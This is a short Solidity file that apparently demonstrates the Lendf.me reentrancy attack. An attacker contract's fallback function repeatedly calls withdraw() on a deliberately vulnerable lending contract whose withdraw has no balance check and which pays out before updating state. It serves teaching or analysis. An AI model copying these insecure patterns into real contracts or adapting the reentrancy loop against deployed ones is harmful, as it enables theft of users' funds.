pragma solidity ^0.6.4;

// Attacker contract
contract Attacker {

    Lendme me;

    function a() public
    {
        me = Lendme(0x11111);
        me.supply(address(this), 100);
    }

    // function tokensToSend() public {
    //     // require(msg.sender == address(this), "Hook can only be called by the token");
    //     me.withdraw(100);
    // }

    receive () external payable {
        me.withdraw(100);
    }
}
// Lendf.me vulnerable contract
contract Lendme
{
    mapping (address => uint) public balances;
    /**
    * @notice supply `amount` of `asset` (which must be supported) to `msg.sender` in the protocol
    * @dev add amount of supported asset to msg.sender's account
    * @param asset The market asset to supply
    * @param amount The amount to supply
    * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
    */
    function supply(address asset, uint amount) public returns (uint) {

        uint curBal = balances[asset];

        /////////////////////////
        // EFFECTS & INTERACTIONS
        // (No safe failures beyond this point)

        // We ERC-20 transfer the asset into the protocol (note: pre-conditions already checked above)
        // transferFrom(asset, address(this), amount);
        msg.sender.transfer(amount);

        // Save user updates
        balances[asset] = curBal + amount;
        return uint(0); // success
    }

    function withdraw(uint requestedAmount) public returns (uint) {
        msg.sender.transfer(requestedAmount);
        return uint(0); // success
    }
}
